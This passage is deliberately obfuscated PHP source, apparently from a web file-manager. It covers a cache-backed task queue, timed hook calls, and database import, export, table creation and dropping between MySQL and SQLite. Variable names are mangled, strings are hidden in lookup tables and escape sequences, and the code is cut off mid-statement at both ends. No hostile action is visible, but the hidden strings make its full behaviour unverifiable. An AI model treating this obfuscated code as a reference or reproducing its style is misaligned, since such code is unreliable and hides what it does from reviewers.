write_log($®Êê¹¯Ğ[1891] . $İ’ó‚ëı, $®Êê¹¯Ğ[198]); return !0; } public static function run() { $Î©¨“ìâ =& $_SERVER[¼¥ÊĞÙÌ]; $®à¼÷Ò© = self::getAll(); $ß‰ô ı€ = array_shift($®à¼÷Ò©); if (!$ß‰ô ı€) { return !1; } self::setAll($®à¼÷Ò©); $ë„ÉÌŠˆ = timeFloat(); $‘¾‘­º× = $Î©¨“ìâ[12]; try { $‘¾‘­º× = Hook::apply($ß‰ô ı€[$Î©¨“ìâ[344]], $ß‰ô ı€[$Î©¨“ìâ[1890]]); } catch (Exception $Ù ˜é…ê) { write_log($Ù ˜é…ê, $Î©¨“ìâ[1276]); } $«²ßß« = number_format(timeFloat() - $ë„ÉÌŠˆ, 3) . $Î©¨“ìâ[1806]; if ($‘¾‘­º× && is_string($‘¾‘­º×)) { $«²ßß« = $«²ßß« . $Î©¨“ìâ[1892] . $‘¾‘­º×; } write_log($Î©¨“ìâ[1893] . $ß‰ô ı€[$Î©¨“ìâ[529]] . $Î©¨“ìâ[1894] . $«²ßß«, $Î©¨“ìâ[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Ò™Ùš =& $_SERVER[¼¥ÊĞÙÌ]; $ƒ–şºşÌ = self::threadCount() + 1; if ($ƒ–şºşÌ > 3 || !self::count()) { return; } write_log($Ò™Ùš[1895] . $ƒ–şºşÌ, $Ò™Ùš[198]); Cache::set(self::QUEUE_THREAD, $ƒ–şºşÌ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Ò™Ùš[1896], $Ò™Ùš[198]); } public static function getKey($ š½ŸÅç, $‡€Ìüñ£ = "\x69\156\164") { $ñ½×ê“İ =& $_SERVER[¼¥ÊĞÙÌ]; Cache::removeMemory($ š½ŸÅç); $ˆªÁêƒö = Cache::get($ š½ŸÅç); if ($‡€Ìüñ£ == $ñ½×ê“İ[366]) { return $ˆªÁêƒö ? intval($ˆªÁêƒö) : 0; } if ($‡€Ìüñ£ == $ñ½×ê“İ[1897]) { return is_array($ˆªÁêƒö) ? $ˆªÁêƒö : array(); } return $ˆªÁêƒö; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[¼¥ÊĞÙÌ][1897]); } public static function setAll($ƒ™„›…ß) { $·ÔÏú¯ò = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ƒ™„›…ß), $·ÔÏú¯ò); Cache::set(self::QUEUE_DATA, $ƒ™„›…ß, $·ÔÏú¯ò); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($á±·£, $ÑãŞ‹†õ = 5.0) { if (!$á±·£) { return; } $º‘Ñšô’ = Cache::get($á±·£); if (!$º‘Ñšô’ || timeFloat() - floatVal($º‘Ñšô’) >= $ÑãŞ‹†õ) { Cache::set($á±·£, timeFloat(), $ÑãŞ‹†õ * 10); return !0; } return !1; } public static function timeLimitCall($€ÈšŞÖ, $ö´é¥ÇÚ, $ìëşœï, $Åá†ï = 5.0) { $„»—À©Ó =& $_SERVER[¼¥ÊĞÙÌ]; if (!$€ÈšŞÖ || !$ö´é¥ÇÚ) { return; } self::$asyncAdd = !0; $äÎ‘º©ç = $„»—À©Ó[1898]; $ş‘üõÅş = Cache::get($äÎ‘º©ç, !0); $áÉ‰–„Õ = array($„»—À©Ó[1899] => timeFloat(), $„»—À©Ó[1900] => timeFloat(), $„»—À©Ó[344] => $ö´é¥ÇÚ, $„»—À©Ó[1890] => $ìëşœï, $„»—À©Ó[207] => $Åá†ï); if (is_array($ş‘üõÅş[$€ÈšŞÖ])) { $áÉ‰–„Õ[$„»—À©Ó[1900]] = $ş‘üõÅş[$€ÈšŞÖ][$„»—À©Ó[1900]]; } if (is_array($ş‘üõÅş[$€ÈšŞÖ])) { if (timeFloat() - $ş‘üõÅş[$€ÈšŞÖ][$„»—À©Ó[1899]] < $áÉ‰–„Õ[$„»—À©Ó[207]] * 0.3) { return; } $áÉ‰–„Õ[$„»—À©Ó[1900]] = $ş‘üõÅş[$€ÈšŞÖ][$„»—À©Ó[1900]]; } $ş‘üõÅş[$€ÈšŞÖ] = $áÉ‰–„Õ; Cache::set($äÎ‘º©ç, $ş‘üõÅş, 60); Cache::removeMemory($äÎ‘º©ç); write_log($„»—À©Ó[1901] . $€ÈšŞÖ . $„»—À©Ó[74] . $ö´é¥ÇÚ, $„»—À©Ó[198]); } public static function timeLimitCallLoop() { $•ö¥äÔ =& $_SERVER[¼¥ÊĞÙÌ]; $¸‡É£Íù = array($•ö¥äÔ[1902]); $¯È±«Ò = in_array(strtolower(ACTION), $¸‡É£Íù); if (!$¯È±«Ò && !self::$asyncAdd) { return; } $â¦ŠÏØ¼ = $•ö¥äÔ[1898]; $¼Å›Ëá¡ = Cache::get($â¦ŠÏØ¼, !0); if (!$¼Å›Ëá¡ || count($¼Å›Ëá¡) <= 0) { return; } $“êüıÄ = !1; $ë••ÔĞÛ = timeFloat(); $Õš˜£­® = array(); foreach ($¼Å›Ëá¡ as $ÎÔÜˆğÙ => $¶„ŸÓâ£) { if ($ë••ÔĞÛ - $¶„ŸÓâ£[$•ö¥äÔ[1900]] > $¶„ŸÓâ£[$•ö¥äÔ[207]]) { $“êüıÄ = !0; try { Hook::apply($¶„ŸÓâ£[$•ö¥äÔ[344]], $¶„ŸÓâ£[$•ö¥äÔ[1890]]); write_log($•ö¥äÔ[1903] . $ÎÔÜˆğÙ . $•ö¥äÔ[74] . $¶„ŸÓâ£[$•ö¥äÔ[344]] . $•ö¥äÔ[1904] . ACTION, $•ö¥äÔ[198]); } catch (Exception $ã¢â³¶Ç) { } continue; } $Õš˜£­®[$ÎÔÜˆğÙ] = $¶„ŸÓâ£; } if (!$“êüıÄ) { return; } if (!$Õš˜£­®) { return Cache::remove($â¦ŠÏØ¼); } Cache::set($â¦ŠÏØ¼, $Õš˜£­®, 60); Cache::removeMemory($â¦ŠÏØ¼); } public static function finished($¦Êª’ŞÔ, $ù³´çû) { $ú¿£Ì¯ï =& $_SERVER[¼¥ÊĞÙÌ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ú¿£Ì¯ï[344] => $¦Êª’ŞÔ, $ú¿£Ì¯ï[1890] => $ù³´çû); } private static function finishedRun() { $ï¹¥¡Ë¸ =& $_SERVER[¼¥ÊĞÙÌ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ûÆÒ‚µÖ) { try { Hook::apply($ûÆÒ‚µÖ[$ï¹¥¡Ë¸[344]], $ûÆÒ‚µÖ[$ï¹¥¡Ë¸[1890]]); } catch (Exception $º®š«ĞÃ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto Aµ½Ïæ–âç; e†ÊÚŠàö¥: class DbManage { function __construct($×“®”ÃÏ = array()) { $û…Äï¸ =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($×“®”ÃÏ)) { $×“®”ÃÏ = $GLOBALS[$û…Äï¸[6]][$û…Äï¸[21]]; } $this->database = $×“®”ÃÏ; } public function model($åƒ·”î = '') { return new ModelBase($åƒ·”î, $_SERVER[¼¥ÊĞÙÌ][12], $this->database); } public function db($Ä±¥¨úã = false) { $âÓßó´¨ =& $_SERVER[¼¥ÊĞÙÌ]; $ƒº¯•Æ = array_change_key_case($this->database); if ($this->dbType() == $âÓßó´¨[13] || !$Ä±¥¨úã) { return $this->model()->db(); } $¹Ò¢×¼² = $ƒº¯•Æ[$âÓßó´¨[1058]]; $ƒº¯•Æ[$âÓßó´¨[1058]] = $âÓßó´¨[12]; if ($ƒº¯•Æ[$âÓßó´¨[1053]] == $âÓßó´¨[1050]) { $ÔœÍ”™ = $ƒº¯•Æ[$âÓßó´¨[1059]]; $ƒº¯•Æ[$âÓßó´¨[1059]] = substr($ÔœÍ”™, 0, strrpos($ÔœÍ”™, $âÓßó´¨[1146])); } $this->database = $ƒº¯•Æ; $å†·×¹® = $this->model()->db(); try { $óæ©ô÷ş = $å†·×¹®->execute("\x73\150\x6f\x77\x20\144\x61\x74\x61\142\141\x73\x65\163\x20\154\x69\x6b\x65\40\x27{$¹Ò¢×¼²}\47"); } catch (Exception $ÑïÖ¤Öç) { } if (!$óæ©ô÷ş) { $å†·×¹®->execute("\x63\x72\145\x61\x74\145\40\144\x61\x74\x61\x62\x61\x73\145\40\x60{$¹Ò¢×¼²}\140"); } $ƒº¯•Æ[$âÓßó´¨[1058]] = $¹Ò¢×¼²; if ($ƒº¯•Æ[$âÓßó´¨[1053]] == $âÓßó´¨[1050]) { $ƒº¯•Æ[$âÓßó´¨[1059]] .= $âÓßó´¨[1146] . $¹Ò¢×¼²; } $this->database = $ƒº¯•Æ; $å†·×¹®->execute("\x75\163\x65\40\x60{$¹Ò¢×¼²}\140"); return $å†·×¹®; } public function createTable($²Ç±ãô, &$´âÎàÃŸ) { $Ñ­•± =& $_SERVER[¼¥ÊĞÙÌ]; if (!IO::exist($²Ç±ãô)) { ActionCall($Ñ­•±[1147], !0, 0); show_json(LNG($Ñ­•±[1148]), !1); } $øµÁà = $this->model()->db(); $§Ï“Ó˜ = sqlSplit(IO::getContent($²Ç±ãô)); foreach ($§Ï“Ó˜ as $¢•À’ˆ’) { $µ¶Ñò• = stripos($¢•À’ˆ’, $Ñ­•±[1149]) === 0; if ($µ¶Ñò•) { $´âÎàÃŸ->task[$Ñ­•±[1150]] += 1; } $øµÁà->execute($¢•À’ˆ’); if ($µ¶Ñò•) { preg_match($Ñ­•±[1151], $¢•À’ˆ’, $øãëºí); $´âÎàÃŸ->task[$Ñ­•±[1152]] = $øãëºí[1]; $´âÎàÃŸ->update(1); } } } public function insertTable($’ì¹­àõ, &$Œú“—Ë×) { $ÌĞáß =& $_SERVER[¼¥ÊĞÙÌ]; $ïÔ÷Õ¦† = $this->model()->db(); $ŸïÎ›Œğ = $±À¡¾ı± ? array($±À¡¾ı±) : $ïÔ÷Õ¦†->getTables(); foreach ($’ì¹­àõ as $â‘ˆÎ­µ) { $±À¡¾ı± = basename($â‘ˆÎ­µ, $ÌĞáß[864]); if (!in_array($±À¡¾ı±, $ŸïÎ›Œğ)) { continue; } $Œú“—Ë×->task[$ÌĞáß[1152]] = $±À¡¾ı±; if (get_filesize($â‘ˆÎ­µ) == 0) { continue; } $­­ÂÍ¾’ = $this->sqlToDb($â‘ˆÎ­µ, $Œú“—Ë×); if (!$­­ÂÍ¾’) { ActionCall($ÌĞáß[1147], !0, 0); show_json(LNG($ÌĞáß[1153]) . "\133{$±À¡¾ı±}\135", !1); } } } public function sqlFromDb($ÆŸù‹Œê, $§œœ€¤, &$àğŒÏùæ, $û›Õ°¦ = '') { if ($àğŒÏùæ) { $àğŒÏùæ->task[$_SERVER[¼¥ÊĞÙÌ][1152]] = $ÆŸù‹Œê; } $®ÎÍÖË = $this->model($ÆŸù‹Œê); $‰Î’÷» = 0; $Õ“‡‰Í® = 0; $Öó›ÉÙ = 10000; $·¾ù®àÏ = fopen($§œœ€¤, $_SERVER[¼¥ÊĞÙÌ][1154]); $Ê”ˆÀ€‰ = $®ÎÍÖË->getPk(); $âèÇç´Î = $®ÎÍÖË->getDbFields(); $òŒïÌ¯‰ = $_SERVER[¼¥ÊĞÙÌ][12]; if ($GLOBALS[$_SERVER[¼¥ÊĞÙÌ][863]] && in_array($ÆŸù‹Œê, array($_SERVER[¼¥ÊĞÙÌ][1155], $_SERVER[¼¥ÊĞÙÌ][1156]))) { $òŒïÌ¯‰ = $ÆŸù‹Œê; } do { $¼ÚôÀ = array($Ê”ˆÀ€‰ => array($_SERVER[¼¥ÊĞÙÌ][1100], $Õ“‡‰Í®)); $ÓØ…£À˜ = $®ÎÍÖË->where($¼ÚôÀ)->field($âèÇç´Î)->order($Ê”ˆÀ€‰ . $_SERVER[¼¥ÊĞÙÌ][1157])->limit($Öó›ÉÙ)->select(); $ÓØ…£À˜ = !empty($ÓØ…£À˜) ? $ÓØ…£À˜ : array(); if (!($“¢ø˜Óú = count($ÓØ…£À˜))) { break; } $ã§—Åõ = end($ÓØ…£À˜); $Õ“‡‰Í® = $ã§—Åõ[$Ê”ˆÀ€‰]; $¶ûùİô = array(); foreach ($ÓØ…£À˜ as $«Ñûïà) { if ($òŒïÌ¯‰) { if ($ÆŸù‹Œê == $_SERVER[¼¥ÊĞÙÌ][1155]) { if ($«Ñûïà[$_SERVER[¼¥ÊĞÙÌ][33]] == $_SERVER[¼¥ÊĞÙÌ][1158]) { $·İÈÆàø = json_decode($«Ñûïà[$_SERVER[¼¥ÊĞÙÌ][453]], !0); if ($·İÈÆàø[$_SERVER[¼¥ÊĞÙÌ][32]] == $GLOBALS[$_SERVER[¼¥ÊĞÙÌ][863]] && $·İÈÆàø[$_SERVER[¼¥ÊĞÙÌ][824]] != 1) { continue; } } } else { if ($«Ñûïà[$_SERVER[¼¥ÊĞÙÌ][33]] == $_SERVER[¼¥ÊĞÙÌ][1159] && $«Ñûïà[$_SERVER[¼¥ÊĞÙÌ][97]] == $_SERVER[¼¥ÊĞÙÌ][859]) { continue; } } } if ($û›Õ°¦) { $«Ñûïà[$_SERVER[¼¥ÊĞÙÌ][87]] = "\173\x69\157\72{$û›Õ°¦}\175" . substr($«Ñûïà[$_SERVER[¼¥ÊĞÙÌ][87]], strlen("\173\151\x6f\72{$«Ñûïà[$_SERVER[¼¥ÊĞÙÌ][897]]}\175")); $«Ñûïà[$_SERVER[¼¥ÊĞÙÌ][897]] = $û›Õ°¦; } $¶ûùİô[] = $_SERVER[¼¥ÊĞÙÌ][1160] . $this->sqlEncode($«Ñûïà) . $_SERVER[¼¥ÊĞÙÌ][1161]; } $¨ÌÂ‘ÈÜ = "\111\x4e\123\105\x52\x54\x20\111\x4e\x54\117\x20\x60{$ÆŸù‹Œê}\x60\x20\x28\x60" . implode($_SERVER[¼¥ÊĞÙÌ][1162], $âèÇç´Î) . $_SERVER[¼¥ÊĞÙÌ][1163]; fwrite($·¾ù®àÏ, $¨ÌÂ‘ÈÜ . implode($_SERVER[¼¥ÊĞÙÌ][1164], $¶ûùİô) . $_SERVER[¼¥ÊĞÙÌ][74] . PHP_EOL); $‰Î’÷» += $“¢ø˜Óú; if ($àğŒÏùæ) { $àğŒÏùæ->update($“¢ø˜Óú); } } while ($Öó›ÉÙ == $“¢ø˜Óú); fclose($·¾ù®àÏ); return $‰Î’÷»; } public function sqlToDb($Ãõ°Ûï´, &$ˆ†·Óâ ) { $ÁõˆÆÆ÷ =& $_SERVER[¼¥ÊĞÙÌ]; $üñØœ±Ô = $this->model()->db(); $çèñÓ‚ = @fopen($Ãõ°Ûï´, $ÁõˆÆÆ÷[1165]); if (!$çèñÓ‚) { return !1; } $Ò£¹ô¼Û = 0; $…ÂõÂæ = $ÁõˆÆÆ÷[12]; $ßçÓ˜Œ = array(); $é¶ŞÃ”¡ = $this->dbType(); $«òÈ ¯œ = $é¶ŞÃ”¡ == $ÁõˆÆÆ÷[13] ? 500 : 2000; $”úÇôÜï = basename($Ãõ°Ûï´, $ÁõˆÆÆ÷[864]); $ĞŒİÉä© = 0; $ïèœöåã = 4194304; while (!feof($çèñÓ‚)) { $éáòÊÎ = trim(fgets($çèñÓ‚)); if (!$éáòÊÎ) { continue; } $¶®èÆÍû = $this->sqlDecode($éáòÊÎ, $é¶ŞÃ”¡, $”úÇôÜï); if (stripos($¶®èÆÍû, $ÁõˆÆÆ÷[433]) === 0) { if (!$…ÂõÂæ) { $…ÂõÂæ = $¶®èÆÍû . $ÁõˆÆÆ÷[53]; } continue; } if ($ˆ†·Óâ ) { $ˆ†·Óâ ->task[$ÁõˆÆÆ÷[1150]] += 1; } $Ò£¹ô¼Û++; $ßçÓ˜Œ[] = rtrim(rtrim(trim($¶®èÆÍû), $ÁõˆÆÆ÷[50]), $ÁõˆÆÆ÷[74]); $ğü¥«±ñ = null; $¢¿Ú˜Õ = strlen($¶®èÆÍû); $ĞŒİÉä© += $¢¿Ú˜Õ; $ìÆ€†ˆÄ = strlen($…ÂõÂæ) + $ĞŒİÉä© + (count($ßçÓ˜Œ) - 1); if ($ìÆ€†ˆÄ >= $ïèœöåã) { $ğü¥«±ñ = array_pop($ßçÓ˜Œ); if ($Ò£¹ô¼Û > 1) { $Ò£¹ô¼Û--; } } if ($Ò£¹ô¼Û >= $«òÈ ¯œ || $ğü¥«±ñ) { $¶®èÆÍû = $…ÂõÂæ . implode($ÁõˆÆÆ÷[50], $ßçÓ˜Œ); if (!$üñØœ±Ô->execute($¶®èÆÍû)) { return !1; } if ($ˆ†·Óâ ) { $ˆ†·Óâ ->update($Ò£¹ô¼Û); } $ßçÓ˜Œ = array(); $Ò£¹ô¼Û = 0; $ĞŒİÉä© = 0; if ($ğü¥«±ñ) { $ßçÓ˜Œ = array($ğü¥«±ñ); $Ò£¹ô¼Û = 1; $ĞŒİÉä© = $¢¿Ú˜Õ; } } } fclose($çèñÓ‚); if (!empty($ßçÓ˜Œ)) { $¶®èÆÍû = $…ÂõÂæ . implode($ÁõˆÆÆ÷[50], $ßçÓ˜Œ); if (!$üñØœ±Ô->execute($¶®èÆÍû)) { return !1; } if ($ˆ†·Óâ ) { $ˆ†·Óâ ->update($Ò£¹ô¼Û); } } return !0; } public function dropTable($­¶â·Âˆ = null) { $£¦äàÚ… = $this->model()->db(); $ƒíÒ‰ı = $­¶â·Âˆ ? array($­¶â·Âˆ) : $£¦äàÚ…->getTables(); if (!$ƒíÒ‰ı) { return; } foreach ($ƒíÒ‰ı as $­¶â·Âˆ) { if ($­¶â·Âˆ) { $­¶â·Âˆ = strtolower($­¶â·Âˆ); } else { continue; } $£¦äàÚ…->execute("\144\x72\x6f\x70\x20\164\141\x62\154\x65\x20\151\146\40\x65\170\151\163\x74\x73\40\x60{$­¶â·Âˆ}\140"); } } private function sqlEncode($÷°·ç¯) { $ŠÎÊÄñê =& $_SERVER[¼¥ÊĞÙÌ]; $ĞÍÂ±¹‹ = array(); foreach ($÷°·ç¯ as $×ğ¯ƒ¬‹) { if (is_array($×ğ¯ƒ¬‹)) { $×ğ¯ƒ¬‹ = json_encode_force($×ğ¯ƒ¬‹); } $×ğ¯ƒ¬‹ = addslashes($×ğ¯ƒ¬‹); $×ğ¯ƒ¬‹ = str_replace(array($ŠÎÊÄñê[1166], $ŠÎÊÄñê[288], $ŠÎÊÄñê[420]), array($ŠÎÊÄñê[1167], $ŠÎÊÄñê[1168], $ŠÎÊÄñê[1169]), $×ğ¯ƒ¬‹); $ĞÍÂ±¹‹[] = $×ğ¯ƒ¬‹; } return $ŠÎÊÄñê[58] . implode($ŠÎÊÄñê[1170], $ĞÍÂ±¹‹) . $ŠÎÊÄñê[58]; } private function sqlDecode($Óä‡èÕû, $½’‰ãÅ, $šÂÍ»Û¥ = '') { $ä÷æÛÒµ =& $_SERVER[¼¥ÊĞÙÌ]; $Óä‡èÕû = str_replace(array($ä÷æÛÒµ[1167], $ä÷æÛÒµ[1168], $ä÷æÛÒµ[1169]), array($ä÷æÛÒµ[1166], $ä÷æÛÒµ[288], $ä÷æÛÒµ[420]), $Óä‡èÕû); if ($½’‰ãÅ == $ä÷æÛÒµ[13]) { $Óä‡èÕû = str_ireplace($ä÷æÛÒµ[1171], $ä÷æÛÒµ[59], $Óä‡èÕû); $Óä‡èÕû = stripslashes($Óä‡èÕû); } return preg_replace($ä÷æÛÒµ[1172], $ä÷æÛÒµ[12], $Óä‡èÕû); if ($½’‰ãÅ == $ä÷æÛÒµ[13]) { return $šÂÍ»Û¥ != $ä÷æÛÒµ[858] ? stripslashes($Óä‡èÕû) : $Óä‡èÕû; } if ($šÂÍ»Û¥ == $ä÷æÛÒµ[858]) { $Óä‡èÕû = str_replace($ä÷æÛÒµ[1173], $ä÷æÛÒµ[121], stripslashes($Óä‡èÕû)); } return $Óä‡èÕû; } public function getSqlFile($áÜâšå = '') { $¢ê¬³ùù =& $_SERVER[¼¥ÊĞÙÌ]; $ÂñÇâĞÊ = $this->dbType(!0); $Ò«óÖ²Ø = CONTROLLER_DIR . "\x69\156\163\164\141\x6c\154\x2f\144\x61\x74\x61\57{$ÂñÇâĞÊ}\x2e\x73\x71\x6c"; $”ÒéÆÎ = file_get_contents($Ò«óÖ²Ø); $æ»‡åÂ = $¢ê¬³ùù[1174] . ($ÂñÇâĞÊ == $¢ê¬³ùù[882] ? $¢ê¬³ùù[1175] : $¢ê¬³ùù[1176]) . $¢ê¬³ùù[1177]; preg_match_all($æ»‡åÂ, $”ÒéÆÎ, $³õêæôÆ); $ŸİË·ª¼ = $³õêæôÆ[1]; $“ÃÎØÁƒ = $this->model()->db(); $–éõåØò = $“ÃÎØÁƒ->getTables(); $¼ÚƒÇûµ = TEMP_FILES . $¢ê¬³ùù[1178] . date($¢ê¬³ùù[262]) . $¢ê¬³ùù[8]; del_dir($¼ÚƒÇûµ); mk_dir($¼ÚƒÇûµ); $‡àšÒœ = $¼ÚƒÇûµ . $¢ê¬³ùù[1179]; $ØùÂ²ı¼ = $¼ÚƒÇûµ . $¢ê¬³ùù[1180]; $ª¹¬¢´× = $ÂñÇâĞÊ == $¢ê¬³ùù[13] ? $¢ê¬³ùù[882] : $¢ê¬³ùù[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\141\154\x6c\x2f\144\141\164\x61\x2f{$ª¹¬¢´×}\56\x73\161\154", $¼ÚƒÇûµ); @touch($¼ÚƒÇûµ . $ÂñÇâĞÊ . $¢ê¬³ùù[864]); $ôïèÍË = fopen($‡àšÒœ, $¢ê¬³ùù[1154]); $…¡å‘³¼ = fopen($ØùÂ²ı¼, $¢ê¬³ùù[1154]); if ($ÂñÇâĞÊ == $¢ê¬³ùù[13]) { $–éõåØò = array_diff($–éõåØò, array($¢ê¬³ùù[856], $¢ê¬³ùù[857])); $Ù†õÎç‡ = array($¢ê¬³ùù[1181], $¢ê¬³ùù[1182], $¢ê¬³ùù[1183]); fwrite($…¡å‘³¼, implode(PHP_EOL, $Ù†õÎç‡) . PHP_EOL . PHP_EOL); foreach ($–éõåØò as $—ë²ÜêÀ) { $‘ƒÜ Ş¦ = $this->sqlFromSqlite($—ë²ÜêÀ); if (!$‘ƒÜ Ş¦[$¢ê¬³ùù[13]]) { continue; } fwrite($…¡å‘³¼, $‘ƒÜ Ş¦[$¢ê¬³ùù[13]] . PHP_EOL . PHP_EOL); if (!in_array($—ë²ÜêÀ, $ŸİË·ª¼)) { fwrite($ôïèÍË, $‘ƒÜ Ş¦[$¢ê¬³ùù[882]] . PHP_EOL . PHP_EOL); } } } else { foreach ($–éõåØò as $—ë²ÜêÀ) { $‘ƒÜ Ş¦ = $this->sqlFromMysql($—ë²ÜêÀ); if (!$‘ƒÜ Ş¦[$¢ê¬³ùù[882]]) { continue; } fwrite($ôïèÍË, $‘ƒÜ Ş¦[$¢ê¬³ùù[882]] . PHP_EOL . PHP_EOL); if (!in_array($—ë²ÜêÀ, $ŸİË·ª¼)) { fwrite($…¡å‘³¼, $‘ƒÜ Ş¦[$¢ê¬³ùù[13]] . PHP_EOL . PHP_EOL); } } } fclose($ôïèÍË); fclose($…¡å‘³¼); $”ÒéÆÎ = array($¢ê¬³ùù[882] => $‡àšÒœ, $¢ê¬³ùù[13] => $ØùÂ²ı¼); return $áÜâšå ? $”ÒéÆÎ[$áÜâšå] : $”ÒéÆÎ; } public function dbType($‘×à’¢À = false) { $‡˜ø =& $_SERVER[¼¥ÊĞÙÌ]; $Œ¡øƒ­ = $‘×à’¢À ? $GLOBALS[$‡˜ø[6]][$‡˜ø[21]] : $this->database; $Œ¡øƒ­ = array_change_key_case($Œ¡øƒ­); $µöóáêï = $Œ¡øƒ­[$‡˜ø[1053]]; if ($µöóáêï == $‡˜ø[1050]) { $œÇ¹ºá« = explode($‡˜ø[4], $Œ¡øƒ­[$‡˜ø[1059]]); $µöóáêï = $œÇ¹ºá«[0]; } $õõ®ÎÎ˜ = array($‡˜ø[1184] => $‡˜ø[13], $‡˜ø[998] => $‡˜ø[882]); if (isset($õõ®ÎÎ˜[$µöóáêï])) { $µöóáêï = $õõ®ÎÎ˜[$µöóáêï]; } return $µöóáêï; } public function sqlFromMysql($àÙŠ¶›Ë, $º—‘´ÅĞ = '') { $´â­¸ß =& $_SERVER[¼¥ÊĞÙÌ]; $ŠÌ¢§¬‘ = $this->model()->db(); $š±ÊèÓ· = $ŠÌ¢§¬‘->query($´â­¸ß[1185] . $àÙŠ¶›Ë . $´â­¸ß[464]); if (!$š±ÊèÓ· || !$š±ÊèÓ·[0]) { return !1; } $„İîÒœ = _get($š±ÊèÓ·[0], $´â­¸ß[1186], $´â­¸ß[12]); if (!$„İîÒœ) { return !1; } $«ÅØù›¥ = "\x44\x52\x4f\120\40\124\x41\x42\114\105\x20\x49\x46\40\105\130\111\x53\x54\123\40\x60{$àÙŠ¶›Ë}\x60\x3b" . PHP_EOL . $„İîÒœ . $´â­¸ß[74]; if ($º—‘´ÅĞ && $º—‘´ÅĞ == $´â­¸ß[882]) { return $«ÅØù›¥; } $‹ßÙ…Ù¹ = array_change_key_case($GLOBALS[$´â­¸ß[6]][$´â­¸ß[21]]); $Š°Ì¿ªÌ = $‹ßÙ…Ù¹[$´â­¸ß[1058]]; $ìîõîìï = $´â­¸ß[1187] . $Š°Ì¿ªÌ . $´â­¸ß[1188] . $àÙŠ¶›Ë . $´â­¸ß[58]; $†¿æ¶¾¦ = $´â­¸ß[1189] . $àÙŠ¶›Ë . $´â­¸ß[986]; $ùòÔîäÚ = $ŠÌ¢§¬‘->query($ìîõîìï); if (empty($ùòÔîäÚ)) { $æ¤ê›ë¹ = array($´â­¸ß[882] => $´â­¸ß[12], $´â­¸ß[13] => $´â­¸ß[12]); return $º—‘´ÅĞ ? $æ¤ê›ë¹[$º—‘´ÅĞ] : $æ¤ê›ë¹; } $½òˆÂ—Ø = $ŠÌ¢§¬‘->query($†¿æ¶¾¦); $è¶ÉåúÆ = $´â­¸ß[12]; $˜Á›„Ç± = array(); foreach ($½òˆÂ—Ø as $Ş®Óˆ¦±) { if (!$è¶ÉåúÆ && $Ş®Óˆ¦±[$´â­¸ß[1190]] == $´â­¸ß[1191]) { $è¶ÉåúÆ = $Ş®Óˆ¦±[$´â­¸ß[1192]]; } if (isset($˜Á›„Ç±[$Ş®Óˆ¦±[$´â­¸ß[1190]]])) { $˜Á›„Ç±[$Ş®Óˆ¦±[$´â­¸ß[1190]]][$´â­¸ß[1193]][] = $Ş®Óˆ¦±[$´â­¸ß[1192]]; continue; } $˜Á›„Ç±[$Ş®Óˆ¦±[$´â­¸ß[1190]]] = array($´â­¸ß[1194] => $Ş®Óˆ¦±[$´â­¸ß[1190]], $´â­¸ß[1193] => array($Ş®Óˆ¦±[$´â­¸ß[1192]]), $´â­¸ß[1195] => $Ş®Óˆ¦±[$´â­¸ß[1196]] == $´â­¸ß[91] ? 0 : 1); } $®ÚÄ¡ş = array(); foreach ($˜Á›„Ç± as $Ş®Óˆ¦±) { $§–ëÁ  = $Ş®Óˆ¦±[$´â­¸ß[1194]] == $´â­¸ß[1191]; $‚øÙ“úû = array($´â­¸ß[1197], $Ş®Óˆ¦±[$´â­¸ß[1195]] == $´â­¸ß[91] && !$§–ëÁ  ? $´â­¸ß[1198] : $´â­¸ß[12], $´â­¸ß[1199], $´â­¸ß[1200] . $àÙŠ¶›Ë . $´â­¸ß[11] . ($§–ëÁ  ? $´â­¸ß[1201] : $Ş®Óˆ¦±[$´â­¸ß[1194]]) . $´â­¸ß[121], $´â­¸ß[1202], $´â­¸ß[121] . $àÙŠ¶›Ë . $´â­¸ß[121], $´â­¸ß[1203] . implode($´â­¸ß[1204], $Ş®Óˆ¦±[$´â­¸ß[1193]]) . $´â­¸ß[1205]); $®ÚÄ¡ş[] = implode($´â­¸ß[53], $‚øÙ“úû) . $´â­¸ß[74]; } $ıƒ·ãÆ— = array(); $Š›ç—Ç× = array($´â­¸ß[1206] => $´â­¸ß[1207], $´â­¸ß[1207] => $´â­¸ß[1207], $´â­¸ß[366] => $´â­¸ß[393], $´â­¸ß[365] => $´â­¸ß[393]); foreach ($ùòÔîäÚ as $Ş®Óˆ¦±) { $‚øÙ“úû = array($´â­¸ß[121] . $Ş®Óˆ¦±[$´â­¸ß[1208]] . $´â­¸ß[121], isset($Š›ç—Ç×[$Ş®Óˆ¦±[$´â­¸ß[1209]]]) ? $Š›ç—Ç×[$Ş®Óˆ¦±[$´â­¸ß[1209]]] : $Ş®Óˆ¦±[$´â­¸ß[1210]], $Ş®Óˆ¦±[$´â­¸ß[1211]] == $´â­¸ß[984] ? $´â­¸ß[1212] : $´â­¸ß[1213], $Ş®Óˆ¦±[$´â­¸ß[1208]] == $è¶ÉåúÆ ? $´â­¸ß[1214] : $´â­¸ß[12], $Ş®Óˆ¦±[$´â­¸ß[1035]] ? strtoupper(str_replace($´â­¸ß[11], $´â­¸ß[12], $Ş®Óˆ¦±[$´â­¸ß[1035]])) : $´â­¸ß[12]); $ıƒ·ãÆ—[] = trim(implode($´â­¸ß[53], $‚øÙ“úû)); } $ãíÀ˜÷× = array($´â­¸ß[1215] . $àÙŠ¶›Ë . $´â­¸ß[1216], $´â­¸ß[1217] . $àÙŠ¶›Ë . $´â­¸ß[1218], implode($´â­¸ß[50] . 